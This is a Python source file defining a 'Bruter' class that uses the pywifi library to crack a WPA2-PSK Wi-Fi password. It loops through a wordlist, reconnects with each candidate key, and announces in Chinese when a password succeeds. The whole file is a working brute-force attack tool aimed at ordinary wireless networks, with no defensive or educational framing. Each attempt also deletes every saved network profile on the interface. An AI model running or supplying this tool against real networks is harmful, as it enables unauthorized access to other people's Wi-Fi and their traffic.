# -*- encoding = utf-8 -*-
# author : manlu
import datetime
import time
import pywifi


class Bruter:
    def __init__(self,target,passwords,timewait,interface):
        self.flag=0
        if interface!=None:
            try:
                f=open(passwords,'r',encoding='utf-8')
            except FileNotFoundError:
                print("[-] 未找到该文件")
            except UnicodeDecodeError:
                print("[-] 文件打开失败")
            else:
                lines=[x.strip() for x in f.readlines() if x.strip()!=""]
                if len(lines)<=0 and target.strip()!="":
                    print("[-] 空文件")
                else:
                    self.flag=1
                    self.target=target
                    self.passwords=lines
                    self.timewait=timewait
                    self.interface=interface
                f.close()
        else:
            print("[-] 无网卡，请先运行 test 指令扫描网卡")


    def run(self):
        if self.flag:
            print("[-] 开始破解，请耐心等待，可能耗时较久")
            now=datetime.datetime.now()
            for i in self.passwords:
                print("[-] 当前密码 : %s"%i)
                b=self.connect(i)
                if b:
                    end = datetime.datetime.now()
                    print("[!] 破解成功，密码为 : %s"%i)
                    print("[!] 本次破解共耗时 {} s".format(end-now))
                    return i
            end = datetime.datetime.now()
            print("[-] 破解失败")
            print("[-] 本次破解共耗时 {} s".format(end - now))
            return

    def connect(self,key):
        self.interface.disconnect()
        time.sleep(1)
        wifistatus = self.interface.status()
        if wifistatus == pywifi.const.IFACE_DISCONNECTED:
            profile = pywifi.Profile()
            profile.ssid=self.target
            profile.auth = pywifi.const.AUTH_ALG_OPEN
            profile.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
            profile.cipher = pywifi.const.CIPHER_TYPE_CCMP
            profile.key = key
            self.interface.remove_all_network_profiles()
            tep_profile = self.interface.add_network_profile(profile)
            self.interface.connect(tep_profile)
            time.sleep(self.timewait)
            if self.interface.status() == pywifi.const.IFACE_CONNECTED:
                return True
            else:
                return False